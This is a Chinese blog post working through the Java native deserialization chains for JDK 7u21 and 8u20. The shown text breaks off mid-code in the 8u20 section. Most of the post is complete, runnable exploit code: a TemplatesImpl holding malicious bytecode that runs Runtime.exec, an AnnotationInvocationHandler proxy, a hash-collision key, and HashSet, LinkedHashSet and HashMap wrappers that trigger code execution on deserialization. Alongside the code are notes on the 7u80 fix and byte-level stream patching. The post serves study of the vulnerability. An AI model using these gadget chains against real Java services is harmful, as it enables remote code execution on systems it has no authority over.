---
title: "7u21&8u20反序列化"
onlyTitle: true
date: 2024-9-18 22:19:57
categories:
- java
- other漏洞
tags:
- java原生RCE
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B897.jpg
---



仅需JDK在指定版本，有反序列化入口，但无需其他的依赖包比如CC，CB能否直接打入反序列化？

其中一个答案就是java原生反序列化链JDK7u21



# jdk7u21原生反序列化

没有CC依赖，那之前的InvokerTransformer，chainedTransformer，LazyMap等都不能使用了。

不能用InvokerTransformer，那就不能用Runtime.exec，只能看是否能动态加载字节码。进而想到TemplatesImpl

```java
public static void main(String[] args) throws Exception {
    byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\RuntimeEvil.class"));
    TemplatesImpl templatesClass = new TemplatesImpl();
    Field[] fields = templatesClass.getClass().getDeclaredFields();
    for (Field field : fields) {
        field.setAccessible(true);
        if (field.getName().equals("_bytecodes")) {
            field.set(templatesClass, new byte[][]{code1});
        } else if (field.getName().equals("_name")) {
            field.set(templatesClass, "godown");
        } else if (field.getName().equals("_tfactory")) {
            field.set(templatesClass, new TransformerFactoryImpl());
        }
    }
}
```

需要触发到templatesClass.newTransformer()

## source:equalsImpl

漏洞点：在7u21的AnnotationInvocationHandler.equalsImpl()中invoke可以反射调用函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240909152646822.png)

但是为了顺利走到`var5.invoke(var1)`需要走过前面的三个if

* var1不是AnnotationInvocationHandler对象自身
* var1需要是this.type类型的实例，也就是继承了Annotation或本身就是Annotation

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240909153325588.png)

* else里的代码逻辑：

* * getMemberMethods获取了type接口下的所有方法，存储到var2。如果这里this.type是Templates接口，那就获取了Templates接口的所有方法
  * ![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240909153630206.png)
  * `this.asOneOfUs(var1) == null`时，循环调用var5.invoke(var1)。var5就是循环调用的equals，hashCode，toString，annotationType。

asOneOfUs判断了var1是否为代理类实例，也就是是否为Proxy.creatProxy创建的对象，这里传进去TemplatesImpl对象，所以不是

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240909154937700.png)

> 草！记得改依赖SDK
>
> ![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240909161659596.png)



这里有一个问题：

为什么直接向构造函数传入Templates.class不会报错？这里不传Annotation的子类为啥不报错

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240910195949562.png)

百度泛型擦除

正确的方法是先随便传个注解类再反射修改为Templates接口。这里type是privite final。关于final修饰符的问题请见

https://godownio.github.io/2024/07/20/lei-urldns-de-cc6/#%E4%BF%AE%E6%94%B9final%E5%AD%97%E6%AE%B5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5



从equalsImpl测试代码：

Evilcode:

```java
public class RuntimeEvil extends AbstractTranslet {
    public RuntimeEvil() throws Exception{
        Runtime.getRuntime().exec("calc");
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

```java
public class JDK7u21 {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\codecollect\\RMIServer\\RMIServer\\target\\classes\\org\\example\\RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        HashMap map = new HashMap();
        Object annotationInvocationHandler = constructor.newInstance(Override.class, map);
        Field typeField = annotationInvocationHandler.getClass().getDeclaredField("type");
        typeField.setAccessible(true);
        typeField.set(annotationInvocationHandler, Templates.class);
        Method method = clazz.getDeclaredMethod("equalsImpl", Object.class);
        method.setAccessible(true);
        method.invoke(annotationInvocationHandler, templatesClass);
    }
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240910202515078.png)



## 动态代理触发equalsImpl

学过CC1都知道，AnnotationInvocationHandler是个动态代理类，用这个类代理其他类，执行方法时会跳转至AnnotationInvocationHandler.invoke

如果满足：

* 方法名是equals
* 参数只有一个
* 第一个参数类型是Object.class

就会执行equalsImpl

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240910202937471.png)

什么地方调用到了equals呢？

很容易想到HashMap。在HashMap的put方法中，调用了equals。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240910204239313.png)

这里的equals刚好满足上面if内的三个条件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240910204500885.png)

这里，key值为AnnotationInvocationHandler代理类，k为templatesImpl恶意字节码对象，就能执行恶意代码。

k是table这个键值对（Entry）的key

跟一下put函数内的addEntry，找到了向table添加新Entry的函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240910210202471.png)

所以如下：

* 先向hashmap put一个key为templatesImpl恶意字节码对象，进而存进table
* 再put一个key为AnnotationInvocationHandler代理类，触发equals

```java
map.put(templatesClass,null);
map.put(annotationInvocationHandler,null);
```



## hash碰撞触发equals

现在有个问题，就是进不了for循环：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914144218579.png)

经过调试，第二次put进去时，由于hash值和第一次put的key不同，索引值i也就不同。就不会取到table[i]进行equals对比

> 我这里想到一个办法，既然hash是用来取table索引值的，那把第一个key直接修改到第二个key索引的table不就行了
>
> 比如templatesImpl对应索引i为4，annotationInvocationHandler对应i为14，那把templtesImpl直接赋值到table[14]，就能完成对比。可惜table是transient不能修改

正确的方法是hash碰撞

在put annotationInvocationHandler时，由于key是代理类，在调用hash(key)时，k.hashCode会跳转到annotationInvocationHandler.invoke

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914152637028.png)

进而跳转至hashCodeImpl()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914152734565.png)

```java
private int hashCodeImpl() {
    int var1 = 0;

    Map.Entry var3;
    for(Iterator var2 = this.memberValues.entrySet().iterator();
        var2.hasNext(); 
        var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) 
    {
        var3 = (Map.Entry)var2.next();
    }

    return var1;
}
```

该函数遍历 this.memberValues 的所有键值对，累加计算一个哈希值。具体步骤如下：

1. 获取 memberValues 的条目迭代器。
2. 遍历过程中，每次取一条键值对。
3. 计算哈希值

memberValues是构造函数传入的var2

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914154747694.png)

如果传入的var2只有一个Entry，那var1就等于

```java
127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())
```

如果`127 * ((String)var3.getKey()).hashCode()`等于0，任何数异或0等于其本身。上式等于`memberValueHashCode(var3.getValue())`



memberValueHashCode根据不同的数据类型获取hash值

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914155513192.png)



也就是说，假如`((String)var3.getKey()).hashCode()`等于0时，返回的var1是传入AnnotationInvocationHandler第二个参数map的hashCode(Value)

令该Value等于第一次put的key，也就是templatesClass恶意类对象，其hashCode就相同，返回值相同，能走进for循环触发equals

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914152637028.png)

一切的问题，都在于怎么使`((String)var3.getKey()).hashCode()`=0

`f5a5a608`hashCode值为0

于是，代码如下：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.xml.transform.Templates;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class JDK7u21 {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\codecollect\\RMIServer\\RMIServer\\target\\classes\\org\\example\\RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        HashMap Annovar2map = new HashMap();
        Annovar2map.put("f5a5a608",templatesClass);
        HashMap map = new HashMap();
        InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, Annovar2map);
        Field typeField = annotationInvocationHandler.getClass().getDeclaredField("type");
        typeField.setAccessible(true);
        typeField.set(annotationInvocationHandler, Templates.class);
        Map annoProxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},annotationInvocationHandler);
        map.put(templatesClass,null);
        map.put(annoProxy,null);
    }
}
```

## 链接到readObject

### HashSet版

HashSet.readObject调用了put

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914201209303.png)

但是由于HashSet在add的时候就会调用put，就会类似URLDNS在反序列化之前就触发，影响判断

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914195459462.png)

所以先把annoProxy的构造函数传入的两个值任选一个先修改

```java
public class JDK7u21 {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\codecollect\\RMIServer\\RMIServer\\target\\classes\\org\\example\\RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        HashMap Annovar2map = new HashMap();
        Annovar2map.put("f5a5a608",templatesClass);
        InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, Annovar2map);
        Field typeField = annotationInvocationHandler.getClass().getDeclaredField("type");
        typeField.setAccessible(true);
        Map annoProxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},annotationInvocationHandler);
        HashSet annoset = new HashSet(2);
        annoset.add(templatesClass);
        annoset.add(annoProxy);
        typeField.set(annotationInvocationHandler, Templates.class);
        serialize(annoset);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```

为什么还是跑不了？

调试的时候发现先put的是annoProxy，（逆序反序列化），后put的templatesClass

> 这里因为没有AnnotationInvocationHandler的源码所以调试报错，不用管。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914204524924.png)

换个顺序就能爆杀辣：

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class JDK7u21 {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\codecollect\\RMIServer\\RMIServer\\target\\classes\\org\\example\\RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        HashMap Annovar2map = new HashMap();
        Annovar2map.put("f5a5a608",templatesClass);
        InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, Annovar2map);
        Field typeField = annotationInvocationHandler.getClass().getDeclaredField("type");
        typeField.setAccessible(true);
        Map annoProxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},annotationInvocationHandler);
        HashSet annoset = new HashSet();
        annoset.add(annoProxy);
        annoset.add(templatesClass);
        typeField.set(annotationInvocationHandler, Templates.class);
        serialize(annoset);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```

当然这种换了个顺序也就不会提前从add触发了，可以把typeField.set移上去



* 为什么ysoserial上面是LinkedHashSet呢？

我也不知道，可能是好看点？你也可以选择用LinkedHashSet装配

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914204859351.png)



反序列化链：

```xml
HashSet.readObject ->
	HashMap.put ->
		AnnotationInvocationHandler.invoke-> hashCodeImpl ->
		AnnotationInvocationHandler.invoke-> equalsImpl ->
			TemplatesImpl.newTransformer
```



### LinkedHashSet版本

LinkedHashSet版：

HashSet.readObject判断如果是用LinkedHashSet对象，就用LinkedHashMap存储。LinkedHashMap增加了一个双向链表来链接所有Entry，遍历时按照元素被插入的顺序进行遍历。add时按照正常顺序add

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917162236398.png)

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;

public class JDK7u21 {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\codecollect\\RMIServer\\RMIServer\\target\\classes\\org\\example\\RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        HashMap Annovar2map = new HashMap();
        Annovar2map.put("f5a5a608",templatesClass);
        InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, Annovar2map);
        Field typeField = annotationInvocationHandler.getClass().getDeclaredField("type");
        typeField.setAccessible(true);
        Map annoProxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},annotationInvocationHandler);
        LinkedHashSet annoset = new LinkedHashSet();
        annoset.add(templatesClass);
        annoset.add(annoProxy);
        typeField.set(annotationInvocationHandler, Templates.class);
        serialize(annoset);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```

LinedHashSet反序列化链

```java
LinkedHashSet.add()
HashSet.readObject ->
	HashMap.put ->
		AnnotationInvocationHandler.invoke-> hashCodeImpl ->
		AnnotationInvocationHandler.invoke-> equalsImpl ->
			TemplatesImpl.newTransformer
```



### HashMap版

今天在搞ROME HotSwappableTargetSource链的时候突然发现，JDK7U21反序列化链不仅HashMap.put触发了key.equals

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240910204239313.png)

putForCreate也调用了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923223431476.png)

而且HashMap.readObject直接调用了putForCreate来还原

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923223524583.png)

what?直接向HashMap两个put不就完了，还搞什么HashSet

开弄！

```java
package org.exploit.misc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.shiro.crypto.hash.Hash;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.LinkedHashSet;
import java.util.Map;

public class JDK7u21_HashMap {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        HashMap Annovar2map = new HashMap();
        Annovar2map.put("f5a5a608",templatesClass);
        InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, Annovar2map);
        Field typeField = annotationInvocationHandler.getClass().getDeclaredField("type");
        typeField.setAccessible(true);
        Map annoProxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},annotationInvocationHandler);
        HashMap annoset = new HashMap();
        annoset.put(annoProxy,"godown");
        annoset.put(templatesClass,"godown");
        typeField.set(annotationInvocationHandler, Templates.class);
        serialize(annoset);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```

所以JDK7u21最外层，用HashMap，HashSet，LinkedHashSet都是可以的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923225801055.png)





## 修复

### 7u80

7u80的AnnotationInvocationHandler构造方法对this.type加强了校验(没什么卵用，反射依旧能改)，重点是在readObject中，this.type不是AnnotationType子类直接报错。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914212135555.png)



# JDK8u20原生反序列化

环境切到8u20

原理方面下文讲的很透彻

https://cloud.tencent.com/developer/article/2204437

该漏洞利用的是`try{...} catch{...}`块有无向外throw异常的区别

区分下面这两个伪代码：

```java
public static void inerror(){
    try{
        codeA  
    } catch(Exception e){
        System.out.println("内层try catch错误");
    }
}
public static void outerror(){
    try{
        inerror();
        codeB
    } catch(Exception e){
        System.out.println("外层try catch错误");
        throw e;
    }
}
```

调用outerror()时，如果inerror()捕捉到了异常，打印了`内层try catch错误`，也会继续执行codeB，而不会进入外层catch。但是如果codeB报错，就会终止代码流程转而报这种红错，而不会进入外层catch

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917101733057.png)



```java
public static void inerror(){
    try{
        codeA  
    } catch(Exception e){
        System.out.println("内层try catch错误");
        throw e;
    }
}
public static void outerror(){
    try{
        inerror();
        codeB
    } catch(Exception e){
        System.out.println("外层try catch错误");
    }
}
```

调用outerror()时，如果inerror()捕捉到了异常，打印了`内层try catch错误`，**不会**继续执行codeB，直接进入外层catch打印`外层try catch错误`。如果inerror没有捕捉到异常，codeB有错，也会进入外层catch打印`外层try catch错误`



目前看来规律就是嵌套的`try{...} catch{...}`只会抛出一个catch，只有内层向外层throw异常的时候，才会逐层向外触发catch。内层函数没有throw异常，则会继续运行内层函数后面的代码。且没有throw的情况下触发第二个异常会终止程序报红错

由于jdk7u21并没有使用到AnnotationInvocationHandler.readObject，所以只要能正常反序列化AnnotationInvocationHandler（不终止进程报红错），就能触发jdk7u21反序列化

让下面的catch不报红错，红框后面的代码不执行也无所谓，已经用defaultReadObject反序列化字段了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917103708775.png)

>defaultReadObject并不会链式调用readOject，只会反序列化该对象的字段
>
>但是对象A有一个字段B，B是一个对象，那在A的readObject调用defaultReadObject，会调用B的readObject

按上面的case来看，需要有以下特点的类来包裹：

* readObject里一个`try{...} catch{...}`触发AnnotationInvocationHandler.readObject
* 上一点的`catch{...}`块不能throw异常

java.beans.beancontext.BeanContextSupport满足以上要求

BeanContextSupport.readObject调用readChildren()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917105019835.png)

readChildren调用子函数readObject，且过程中有捕捉到了异常用continue跳过，下面的代码（强转，调用函数）均没有throw异常

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917105208765.png)

如何用BeanContextSupport.readObject触发AnnotationInvocationHandler.readObject呢？之前我们构造的反序列化链都是利用defaultReadObject反序列化字段，字段为对象进而链式触发readObject

但是BeanContextSupport.readObject的defaultReadObject()不在readChildren内，即使设置字段为AnnotationInvocationHandler对象依旧会catch异常。（更别说该类根本没有能存储HashSet对象的非transient字段

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917181633067.png)

那该怎么触发BeanContextSupport.readChildren->AnnotationInvocationHandler.readObject?



## SerializationDumper

介绍一个工具SerializationDumper

https://github.com/NickstaDB/SerializationDumper

```java
Usage1:java -jar SerializationDumper-v1.1.jar -r out.bin
Usage2:java -jar SerializationDumper-v1.1.jar "aced..."
```

>##### 引用机制
>
>在序列化流程中，对象所属类、对象成员属性等数据都会被使用固定的语法写入到序列化数据，并且会被特定的方法读取；在序列化数据中，存在的对象有null、new objects、classes、arrays、strings、back references等，这些对象在序列化结构中都有对应的描述信息，并且每一个写入字节流的对象都会被赋予引用`Handle`，并且这个引用`Handle`可以反向引用该对象（使用`TC_REFERENCE`结构，引用前面handle的值），引用`Handle`会从`0x7E0000`开始进行顺序赋值并且自动自增，一旦字节流发生了重置则该引用Handle会重新从`0x7E0000`开始。
>
>##### 成员抛弃
>
>在反序列化中，如果当前这个对象中的某个字段并没有在字节流中出现，则这些字段会使用类中定义的默认值，**如果这个值出现在字节流中，但是并不属于对象，则抛弃该值，但是如果这个值是一个对象的话，那么会为这个值分配一个 Handle。**

如果调用两次writeObject进行序列化写入，相比只进行一次`out.writeObject(t);`，用SerializationDumper分析如下

```java
import java.io.*;
public class test implements Serializable {
    private static final long serialVersionUID = 100L;
    public static int num = 0;
    private void readObject(ObjectInputStream input) throws Exception {
        input.defaultReadObject();
        System.out.println("hello!");
    }
    public static void main(String[] args) throws IOException {
        test t = new test();
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("testcase"));
        out.writeObject(t);
        out.writeObject(t); //二次序列化
        out.close();
    }
}
```

注意bin文件要用-r参数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917170245017.png)

序列化两次的会在底部多出TC_REFERENCE块

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917170643117.png)

偏移为0x71，这就是之前提到的

> 每一个写入字节流的对象都会被赋予引用`Handle`，并且这个引用`Handle`可以反向引用该对象（使用`TC_REFERENCE`结构，引用前面handle的值），引用`Handle`会从`0x7E0000`开始进行顺序赋值并且自动自增，一旦字节流发生了重置则该引用Handle会重新从`0x7E0000`开始。

ObjectInputStream序列化流程中，readObject调用readObject0

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917172448599.png)

readObject0记录了各个块的处理方式，其中TC_REFERENCE用readHandle处理

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917172600429.png)

readHandle调用handles.lookupObject返回引用对象

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917172656187.png)

即反序列化过程中，会还原TC_REFERENCE引用的handle对象

TC_REFERENCE中存放的是对象的引用，对象真正的内容存在哪呢?

答案是objectAnnotation块



用以下代码做个例子，用writeObject写入"Panda"和"This is a test data!"的UTF

```java
import java.io.*;
public class test implements Serializable {
    private static final long serialVersionUID = 100L;
    public static int num = 0;
    private void readObject(ObjectInputStream input) throws Exception {
        input.defaultReadObject();
        System.out.println("hello!");
    }
    private void writeObject(ObjectOutputStream output) throws IOException {
        output.defaultWriteObject();
        output.writeObject("Panda");
        output.writeUTF("This is a test data!");
    }

    public static void main(String[] args) throws IOException, ClassNotFoundException {
        test t = new test();
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("testcase_new"));
        out.writeObject(t);
        out.writeObject(t);
        out.close();
    }
}
```

和上一份test2对比序列化内容，多出了classDescFlags和objectAnnotations

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917185752469.png)

* 如果一个可序列化的类重写了`writeObject`方法，而且向字节流写入了一些额外的数据，那么会设置`SC_WRITE_METHOD`标识，这种情况下，一般使用结束符`TC_ENDBLOCKDATA`来标记这个对象的数据结束；

* 如果一个可序列化的类重写了`writeObject`方法，在该序列化数据的`classdata`部分，还会多出个`objectAnnotation`部分，并且如果重写的`writeObject()`方法内除了调用`defaultWriteObject()`方法写对象字段数据，还向字节流中写入了自定义数据，那么在`objectAnnotation`部分会有写入自定义数据对应的结构和值；

`ObjectAnnotation`结构一般由`TC_ENDBLOCKDATA - 0x78` 标记结尾

这个case可以顺利反序列化，因为没有特殊结构的数据

下面这个case能反序列化吗

```java
import java.io.*;
public class test implements Serializable {
    private static final long serialVersionUID = 100L;
    public static int num = 0;
    private void readObject(ObjectInputStream input) throws Exception {
        input.defaultReadObject();
        System.out.println("hello!");
    }
    private void writeObject(ObjectOutputStream output) throws IOException {
        output.defaultWriteObject();
        LinkedHashSet set = new LinkedHashSet();
        set.add("aaa");

        output.writeObject(set);
        output.writeObject("bbb");
        output.writeObject("ccc");
    }

    public static void main(String[] args) throws IOException, ClassNotFoundException {
        test t = new test();
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("testcase_new"));
        out.writeObject(t);
        out.writeObject(t);
        out.close();
    }
}
```

不能，对比以下和三个正常的add有什么区别：

左边是add三次，右边是add一次，writeObject两次

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917202346738.png)

（后面有0x...才是真实有进制数据的，其他的是描述符，比如values这些可以忽略

可以看到有两个差别

* `Contents`值，也就是LinkedHashSet元素个数
* `ObjectAnntation`结束符`TC_ENDBLOCKDATA`标记的位置。writeObject进数据的版本`TC_ENDBLOCKDATA`提前结束了

修改上面两个差别

```java
public static void main(String[] args) throws IOException, ClassNotFoundException {
    test t = new test();
    ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("testcase_new"));
    out.writeObject(t);
    out.writeObject(t);
    out.close();
    byte[] bytes = Files.readAllBytes(Paths.get("testcase_new"));
    bytes[89] = 3;//修改hashset的长度（元素个数）
    for(int i = 0; i < bytes.length; i++){
